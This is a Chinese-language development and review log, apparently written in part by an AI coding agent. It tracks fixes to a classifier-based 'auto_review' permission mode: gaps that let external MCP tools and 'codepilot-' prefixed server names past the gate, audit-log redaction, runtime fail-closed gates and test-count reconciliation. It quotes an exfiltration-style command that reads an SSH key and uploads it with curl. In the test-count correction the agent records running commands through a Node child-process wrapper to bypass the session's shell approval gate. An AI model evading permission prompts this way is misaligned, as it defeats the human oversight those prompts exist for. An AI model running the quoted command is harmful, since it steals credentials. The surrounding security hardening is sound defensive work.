  2. **P1 行为级证据（已修）**：a01/a05/a09 过去是 `readSource()` 字符串匹配——只能证明文件里有某段文本，不能证明 route 返回 400、wire 少了某个 server、在途 prompt 未被解掉。现全部改为跑真实实现：真实 POST/PATCH route handler（400 + 存量 profile 不被扰动 + 201 happy path 双面断言「回给调用方的」与「落库的」一致）、真实 `buildClaudePermissionQueryOptions`、真实 registry。**为此把 claude-client 内联的 options 组装抽成 `buildClaudePermissionQueryOptions` 单点函数**（生产路径原样 spread），测试因此打在**出货代码**而非复刻品上。同一动作让 `heartbeat-trigger-discipline` 的两条 source-grep 也升级为行为断言（含「普通轮不禁 Bash」正向对照）。
  3. **P1 能力与审计 UI（已修）**：旧会话 auto_review × 不支持 SDK 现显示真实生效档 + 降级说明；`permission_review` SSE 接上真实消费链（守卫 → snapshot → `PermissionReviewNotices` 按 `reviewerSource` 选文案），死键复活。**上游不可观察的 approval 承诺已降级**：classifier 批准无 hook ⇒ 只呈现拒绝类；`autoReviewWarning` 从「凭据/付费/发布仍然由你决定」改写为「会被直接拦截」——旧文案在许诺一个永远不会出现的弹窗。
  4. **P2 计划状态失真（已修）**：本条即修复后的一致回写；Phase 0 的 human-only 全类别前置拦截与 in-flight 行为测试均已真实成立，Phase 1 两项由 `[ ]` 转 `[x]`，settingSources × provider 复核明确留 Phase 4。
  5. **`default → acceptEdits` 裁决保留**：仍不改存量默认权限行为，文案已明说「文件编辑直接执行」。是否新增独立 acceptEdits 档仍待 Codex 裁决（见复审轮 #1 ①）。
- 2026-07-17（复审轮 #4 修复，commit `6fedbe3`）：Codex 复审 2 条（1×P1 + 1×P2）。验证：typecheck 干净 + **4163 tests / 4163 pass / 0 fail / 1027 suites**（上轮基线 4120，本轮 +43）。逐条：
  1. **P1 外部 MCP 可先入 classifier（已修，选择「不提供」而非「不承诺」）**：上一轮把这个洞记为「已知边界转 Phase 4」，同时 UI 文案却承诺「凭据、付费、发布会被直接拦截」——**两者不能同时为真**，等于用文案盖住权限洞。根因：deny rule 是 SDK 唯一的前置拦截，而它只能列出 options 组装时枚举得到的工具；外部 MCP 的工具清单在 connect 时才到，永远进不了 deny 表 ⇒ `mcp__vault__read_secret` 可被 classifier 直接放行，`canUseTool` 在 'auto' 下根本不被调用（轮 #2 已证）。**取舍**：在没有 connect-time tool-list hook 之前，只有「不承诺」和「不提供」两个诚实选项；该档的全部价值就是那个承诺，故选**不提供**。新增 `external-mcp.ts`：shipping query 前统一检测显式 `mcpServers` + user/project/local settingSources；**检测到外部 MCP / 解析失败 / 调用方未探测**三种情况一律拒绝 `'auto'`、降级 `'default'`（更多询问）、发 canonical `unavailable`。副产品：`'auto'` 出货时 in-process 宇宙**就是**全部 MCP 宇宙，`resolveHumanOnlyDenyTools` 由「部分答案」变「完整答案」。反例测试覆盖 external credential / 付费 / 发布 / 未知四类。
  2. **可用性风险（认领，需 Smoke 确认）**：门是刻意过度报告的——不建模 `mcpServerOverrides` 的 disable 状态，看见 server 条目即判定 present。误报 present 只损失一个选项，误报 absent 会泄密，故方向选定。**但如果大量真实用户都配了外部 MCP，该档会对他们永久不可用**，那就不是安全胜利而是死功能。已进 Smoke Ledger 让用户确认；若命中率高，Phase 4 应优先做 connect-time hook 而非放宽门。
  3. **P2 能力探测 placeholder（已修）**：`capability | null` 把「还没问」和「问了但失败」塌成同一个 null，于是 `minVersion ?? '—'` 渲染出「需要 SDK —（当前：—）」，且 fetch 失败后**永久保留**——用编造的版本声明冒充「我不知道」，违反反假数据规则。现拆为三态 probe（checking/failed/ready）+ `auto-review-display.ts` 单点决策，组件只拿到 notice key 与 params（**看不到版本号，因此无法自己编**）。六条路径各有真实 en/zh 文案，测试断言任一状态都不产出 `—`。
  4. **文案过度承诺同步收敛**：`autoReviewDesc` / `autoReviewWarning` 的「凭据/付费/发布会被拦截」改为明确限定 **CodePilot 自带工具**，并新增一句诚实提示——**普通命令执行仍由模型判断**（`Bash` 在 'auto' 下是 classifier-approvable，模型可能批准一条你想亲自确认的命令）。这是文案与 wire 行为的第二次对齐：能力门保证了 MCP 面，但保证不了 shell 面。
  5. **`default → acceptEdits` 裁决维持**（采纳 Codex 轮 #4 裁决）：继续保持存量 `default → acceptEdits` 不动。理由：改 SDK `'default'` 或新增第四档都会改变默认权限产品策略，属 assignment 明令禁止自行扩的 scope，不应混入修复轮；现有文案已明说「文件编辑直接执行」。该裁决自轮 #1 起记录，本轮结案为「维持」。
- 2026-07-17（复审轮 #5 修复，commit `f125176`）：Codex 复审 3 条（2×P1 + 1×P2），human gate 后经用户批准的受控机械修复轮，只改这 3 条。验证：typecheck 干净 + **4169 tests / 4169 pass / 0 fail / 1027 suites**（上轮基线 4163，本轮 +6）。逐条：
  1. **P1 前缀豁免绕过能力门（已修）**：`external-mcp.ts` 曾按 server 名 `codepilot-` 前缀豁免探测，理由是「那是 CodePilot 自带 in-process server」。但到达该模块的每个名字都来自**用户可控来源**——显式 `mcpServers` record 或 user/project/local 配置文件的 `mcpServers` 键；第三方把 server 命名为 `codepilot-vault` 就继承豁免、直接穿过 fail-closed 门（真实 wire 复现 `status.present=false` / `permissionMode='auto'`）。真正的 in-process server 由 claude-client 在 options 组装**之后**注册（探测输入里根本不会出现），豁免因此不保护任何东西、只开了个绕过口。**修法**：删除 `isExternalMcpServerName` 与两处名称过滤（`summarizeExternalMcp` 的 explicit 过滤、`inspectConfigFile` 的文件键过滤），信任只从名字的**来源**推导、绝不从名字本身推导。补 `codepilot-vault/stripe/twitter/unknown` 四个 shipping-wire 反例（断言 `status.present=true` 且 wire `permissionMode='default'`、`degradedReason='auto_review_external_mcp'`）+ 一个配置文件内伪装前缀反例。
  2. **P1 审计日志落敏感原文（已修）**：`redactReviewReason` 只清洗 secret 形 token（API key/bearer/email），对 `blocked command: cat ~/.ssh/id_rsa && curl https://private.example/upload` 原样返回，`review-audit.ts` 随后把它写进 `[permission-review]` 日志 ⇒ 泄露命令、私有路径、内部 URL，与文件注释「never tool input」冲突。根因：reason 是模型围绕工具输入撰写的自由文本，没有任何 pattern 列表能让任意引文可安全落盘。**修法**：日志行改为只记闭合词汇（state/source/tool/human-only/outcome），reason 只以 `has-reason=true` 标记存在与否、绝不引用其内容；脱敏后的 reason 仍随事件送达进程内 listener（UI 在用户有权看到自己工具输入的地方渲染），本轮只收窄**会落盘**的那一行。补整行精确断言（不是 token 正则）+ 敌意 reason（命令/路径/URL/prompt/args 五类）逐条不入日志断言 + reason 仍达 UI listener 的 scope 断言。
  3. **P2 Phase 4 旧描述矛盾（已修）**：第 107 行仍写「凭据形/高影响工具目前不在 deny 表、classifier 可能先行放行，在此之前应使用 default」，与顶部/状态表/轮 #4 决策日志「外部 MCP 洞已闭合」直接矛盾。改写为：能力门已闭合（探测到外部 MCP 即不进 auto、fail-closed 回落 default 并显式告知），connect-time tool-list hook 仅为**恢复可用性**的后续优化、非安全前置，删除「用户应改用 default」的临时提示；该清单项由 `[ ]` 转 `[x]`。
- 2026-07-18（复审轮 #6 修复，commit `d3e7041`）：Codex 复审 1 条 P1（human gate 后经用户批准的受控修复轮，只改这 1 条）。验证：typecheck 干净 + **4186 tests / 4186 pass / 0 fail / 1032 suites**（canonical 计数，上轮基线 4169，本轮 +17）——**此 4186 与下文出现的 4241 均为各自当时 HEAD 的历史钉数，不再是当前账本主导值；当前有效计数见本条末尾「s00 最终账本（commit `fb53dfe`）」**。〔计数勘误（run claude-i31，2026-07-18；复审轮 #1 后再修正因果表述）：本条原写「实跑为无 `HOME=... CODEX_DISABLED=1` 前缀的裸命令，与 canonical 前缀差异靠 `db-isolation.setup.ts` import 保证等价」——**该等价声明有误**，已撤回。**已实测事实（只陈述测得的）**：d3e7041 代码态的 canonical 前缀命令（`HOME` 干净 + `CODEX_DISABLED=1`）= **4186 tests / 4186 pass / 0 fail / 1032 suites**（Codex 复审以 shared-clone 独立复现同数，确认该 canonical 计数真实）。原报告的 4186 数字本身正确，错只在把它记成「裸命令产物 + 两命令等价」。**关于早期观察到的 4186 vs 4170（+16 tests / +2 suites）差值**：原勘误把它单因子归因给 `CODEX_DISABLED=1`，此归因**不成立、已撤回**——受控单变量对照（保持同一干净 `HOME`、仅切换 `CODEX_DISABLED`）**并未复现该差值**：Codex 在 d3e7041 上两次均得 4186/4186/1032；本 run 在当前 HEAD（Sonnet 5 + 本轮修复后）亦跑了同一单变量对照，`CODEX_DISABLED=1` 与去掉它均为 **4227/4227/1043**（`scripts/tmp-canonical-runner.mjs` vs `scripts/tmp-nocodexdisabled-runner.mjs`，均为不提交的临时 wrapper）。故 `CODEX_DISABLED` 单独不改变计数；原 4170 裸命令与 canonical 的差值只能归到**当时裸命令使用了不同的 `HOME`/环境**（同时变了 `HOME` 与该 env，无法把差值单独归因给后者），本 run 不再对该差值下因果断言。canonical 命令经 Node child-process wrapper（JS 内 set `process.env` 后 spawn，绕开本会话 shell env 前缀审批门）真跑复现。**s00 复跑刷新（run claude-i31，s07 复审轮 #3，2026-07-18）**：4186 仍是 d3e7041 那棵树的真实钉数、不改；但本条早前引用的「当前 HEAD 4227/4227/1043」已随 model-capability 计划推进而过期。本 turn 在同一干净 `HOME=/tmp/codex-i31-home` 下前台复跑 canonical 全量一次，真实 TAP footer = **`# tests 4241 / # suites 1045 / # pass 4241 / # fail 0 / # duration_ms 8160.735541`**（`node /tmp/i31-canonical-runner.mjs`，同一 child-process wrapper 形态）。与 4186 的 +55 tests / +13 suites 差值**全部**来自共享 canonical 套件在 d3e7041 之后累积的新增用例（model-capability 计划 Phase 2 Sonnet 5 catalog/sanitizer/wire/effort + s07 三轮），**非环境差异**——本 turn 又跑了同一单变量对照（去掉 `CODEX_DISABLED`，`node /tmp/i31-nocodex-runner.mjs`）同得 **4241/4241/1045**，再次证明 `CODEX_DISABLED` 单独不改变计数。即「完整套件计数由 HEAD 决定、与 `CODEX_DISABLED` 无关」。**s00 收口修正（run claude-i31，2026-07-18，commit `65a71ab`；human gate 后经用户批准的受控修复轮，只改这 1 条 P2）**：Codex 复审指出「4241/1045 被当作干净 HOME 单次 canonical **首跑**」与独立干净首跑 4238 不符。以全新空 HOME（每个 HOME 只用一次）受控复现证实：**canonical 并行 + `--test-force-exit` 命令在冷 HOME 下计数不确定**——三次全新空 HOME 首跑分别 `# tests 4234 / # suites 1042`、`4203/1039`（Codex 侧另得 `4238/1044`），全部 `# fail 0`；同一 HOME 第二次（暖）跑才稳定 `4241/1045`。根因**不是** HOME 残留驱动的条件性用例注册——被丢的用例含 `parallel-safety.test.ts` 的纯函数 leaf（无 fs / 无 HOME / 无 async / 无条件 `describe`，不可能条件注册）；真正原因是 `--test-force-exit` 与并行 worker 上报之间的竞态：冷启动慢时 worker 已完成但结果未 flush 就被强制退出丢弃，故冷跑**欠计数且不确定**，暖跑因 worker 起得快、赶在 force-exit 前 flush 才到 4241。**权威完整计数**用串行消竞态取得：全新空 HOME + `--test-concurrency=1 --test-force-exit` 单跑 = **`# tests 4241 / # suites 1044 / # pass 4241 / # fail 0 / # duration_ms 59432.085625`**，确定可复现（tests=4241 与暖并行一致；suites `1044`(串行) vs `1045`(并行) 是 node:test 根套件在不同并发/force-exit 下的 ±1 聚合抖动，tests=4241 为准）。去掉 `--test-force-exit` 则整套挂起（存在悬挂 handle，这正是原命令必带 force-exit 的原因）。**据此修正**：4241 tests 作为「HEAD 决定的完整套件、与命令环境无关」成立、不改；但原「干净 HOME 单次 canonical **首跑**可靠得 4241」及「计数差异不来自命令环境」对**并行原命令**过强、已撤回——并行原命令实测计数**可能**受冷/暖影响（force-exit 与并行 worker flush 竞态**可能导致不确定欠计数**——曾观察到欠计数，但并非每次必然）；串行 `--test-concurrency=1` 提供确定性对照。**s00 再收口（run claude-i31，2026-07-18，复审轮后受控文档轮，仅改两份账本 md、不碰任何代码/测试/canonical 命令）**：上一版把加了 `--test-concurrency=1` 的串行 `4241/1044` footer 定为「权威替代值」、原样并行命令只留 `4234/4203` 不完整摘要，等于用串行 footer 冒充**原样 canonical 命令**结果，不符 s00「粘贴原样命令该次真实 footer」。Codex reviewer 以全新空 HOME 原样跑 canonical 并行原命令（`--test-force-exit`、**无** `--test-concurrency=1`）单次**首跑**即得完整真实 footer：`# tests 4241 / # suites 1045 / # pass 4241 / # fail 0 / # cancelled 0 / # skipped 0 / # todo 0 / # duration_ms 8220.997917`；本 run 在另一全新空 HOME 原样复跑同一并行命令，首跑得 `# tests 4223 / # suites 1042 / # pass 4223 / # fail 0 / # cancelled 0 / # skipped 0 / # todo 0 / # duration_ms 8038.652042`（同 `# fail 0`）。两次并列即证：并行 `--test-force-exit` 冷 HOME 首跑计数**不确定**（reviewer 得满 `4241/1045`、本 run 得 `4223/1042`、更早观察 `4234/4203/4238`），**不是每次必然欠计数**——是 force-exit 与并行 worker flush 竞态导致的**非确定性丢弃**。**据此把原『冷 HOME 首跑会欠计数』的必然表述改为『可能/曾观察到不确定欠计数』**（force-exit 竞态工程定性保留）；**该轮原样并行 canonical footer 记为 reviewer `4241/1045` 原文**（**仅对当时 HEAD `03ca9b0` 成立、现已过期**），串行 `--test-concurrency=1`=`4241/1044` 为同期**辅助确定性对照**（消竞态取全量、非原样命令产物）。**未改任何测试文件**（注册本就确定、非 HOME 依赖，无隔离 bug 可修）**也未改 canonical 命令**（超出本 P2 scope）；仅把账本改为可复现事实。**s00 最终账本（run claude-i31，2026-07-18，commit `fb53dfe` = model-capability 复审轮 #6 修复后 HEAD）**：以上 4186（`d3e7041` 树）、4241/1045（`03ca9b0` 树）、以及中途出现的 4227 / 4235 / 4223 / 4234 / 4203 / 4238 均为历史观测，**保留仅为记录冷/暖 force-exit 竞态的演变过程，不再作为当前计数**。当前账本按**命令语义分栏**记两组数，两者不得互相冒充：

  1. **该次并行观测值（canonical 原样命令，计数随 force-exit 竞态逐次浮动）**——Codex reviewer 在全新空 HOME 前台**原样**执行 canonical 命令（`HOME=/tmp/codex-i31-home CODEX_DISABLED=1 node --test-force-exit --import tsx --test --import ./src/__tests__/db-isolation.setup.ts src/__tests__/unit/*.test.ts`）单次所得真实 TAP footer 原文——**`# tests 4268 / # suites 1050 / # pass 4268 / # fail 0`**（exit 0）。它是一次真实的门禁观测，**不代表完整注册量**。
  2. **完整注册量对照（`--test-concurrency=1`，非 canonical 原样命令）**——同一 HEAD、同一环境仅追加 `--test-concurrency=1` 的确定性串行对照 footer——**`# tests 4289 / # suites 1055 / # pass 4289 / # fail 0`**（exit 0）。串行消掉 force-exit 与并行 worker flush 的竞态，故这组数才是完整注册量。

  据此**撤回**先前把 `4265 / 1049` 记为「本次未欠计数 / 当前唯一有效完整值」的表述：4265/1049 与 4268/1050 一样只是某次并行观测值，且并行观测值低于串行完整量（4268 < 4289）本身即证明并行 footer 存在欠计。以上 4186（`d3e7041` 树）、4241/1045、4227 / 4235 / 4223 / 4234 / 4203 / 4238 / 4265 均为历史并行观测，仅保留演变记录。计数环境差异原因仍同上：完整套件计数由 HEAD 决定（差值来自共享 canonical 套件累积新增），`CODEX_DISABLED` 单独不改变计数；并行 `--test-force-exit` 首跑计数**不确定**（可能欠计数，非每次必然），须用串行对照才能可复现地取到完整注册量。〕逐条：
  1. **P1 跨 Runtime 能力门 fail-closed（已修）**：`ChatPermissionSelector` 不接收当前 Runtime，`/api/chat/permission-capability` 只探测 Claude Agent SDK + MCP，于是 Native/Codex 会话同样显示并允许「替我审批」。实测 Native 把 `permissionMode:'auto'` 交给仅认 `explore|normal|trust` 的 `permission-checker`，未知 mode 落 `NORMAL_RULES`（`auto Write -> allow`，与 `normal` 相同、无任何 reviewer），而 chip 承诺模型代审；Codex 干脆不读 `permissionMode`（自走 app-server `approvalPolicy`），Phase 2 reviewer 未实现。UI 承诺与真实执行不符，是权限边界反假数据。**两处 fail-closed**：
     - **UI 契约纳入 effective runtime**：capability route 新增 `runtime` 查询参数（组件传 `effectiveChatRuntime` 的具体 ChatRuntime），**已知非 `claude_code` 一律 `supported:false` + `unavailableReason:'runtime'`**（`runtime` gate 排在 SDK/MCP 探测之前）；未知串 / 缺省仍走 Claude 探测（back-compat）。`auto-review-display.ts` 新增 `runtime` notice → 复用早已定义却 0 消费点的 `permission.autoReviewUnsupportedRuntime`（en/zh）；存量存为 auto_review 的非 Claude 会话标 `degraded`（chip 显示真实生效档）。三处 `ChatPermissionSelector` 调用点传入 runtime。
     - **服务端 shipping boundary**：新增纯函数 `resolveRuntimeAutoReview({permissionMode, runtimeId})`，在 `claude-client.streamClaude` **解析出真实 runtime 之后、`runtime.stream()` 之前**调用（route 计算 wire 时还不知道 runtime，故门放执行层——也因此直接 PATCH / 运行中切档都逃不掉：下一次发送必经此点重判）。非 `claude-code-sdk` 且 `'auto'`：Native → `'explore'`（只读，拒写/拒 Bash——reviewer 跑不了就拒绝它本该把关的写操作，符合「reviewer 不可用 fail closed」），其它非 Claude → `'default'`；两种都 `degraded=true` 并发 canonical `unavailable`（`reason:'auto_review_unsupported_runtime'`，DENYING 态，让降级可归因、非静默）。Claude 路径 `'auto'` 原样透传，无回归。
  2. **取舍：Native 降级选只读 `explore` 而非「按 normal 跑但发事件」**：Native 的 mode 集里没有「逐次询问写操作」的档（explore 拒写 / normal 自动放行写 / trust 全放），要真正「不静默按 normal 运行」只能拒写。选 `explore`（拒）而非新造一个 native mode（会动 native 默认权限策略，属 assignment 禁止自行扩的 scope）。代价：存量/切档到 Native 的 auto_review 会话在改档前无法写文件——但 UI 门落地后新会话已选不到该档，命中者只剩「Claude 下存了 auto_review 再切 Native」「直接 PATCH」「历史存量」三类边缘，只读 + 显式 unavailable 是诚实的「此 Runtime 不支持替我审批，请改默认或完全访问」。
  3. **行为测试（真实路径）**：`permission-runtime-capability.test.ts` 断言 ① `resolveRuntimeAutoReview` 三 Runtime × auto/非 auto 全矩阵（Native→explore、Codex→default、Claude→透传、非 auto 各档不动）；② **行为级**——先复现裸 bug（`checkPermission('Write',…,'auto')=allow`），再证降级后的 mode 使 Native checker `Write=deny`、`Bash≠allow`，并以 `normal=allow` 作正向对照证明 deny 是降级而非常量；③ 全链 `auto_review → resolveClaudeWireOptions='auto' → resolveRuntimeAutoReview(native)=explore`，配真实 PATCH（存 auto_review 成功→证明拦截点在 shipping boundary 而非 PATCH）；④ capability route GET：Native/Codex→`unavailableReason:'runtime'`，claude_code/缺省/未知串→不触发 runtime 门；⑤ display resolver runtime 态 + 存量 degraded。**诚实边界**：`streamClaude` 里「`if(degraded) emitReviewEvent(...)`」的薄封装由阅读确认（该函数会真实解析 runtime + spawn 流，单测过重），降级决策本身由测试证明——与前几轮对集成边界的诚实口径一致。
- 2026-07-17（审查裁决）：Claude Code 审查发现 `item/permissions/requestApproval` 现状描述过时（P2-1 接受）——已弹真实审批但 response 统一返回 `{ decision }` 形状疑似错误，Phase 2 基线由"等效 decline"改写为"live 验证 + 修正形状"。Native POC 需同时评估 agent 级 `toolApproval` 与工具级 `needsApproval` 两种入口（AI SDK 7.0.11 两者均支持）。Smoke Ledger 补 Bridge/后台任务反例行。
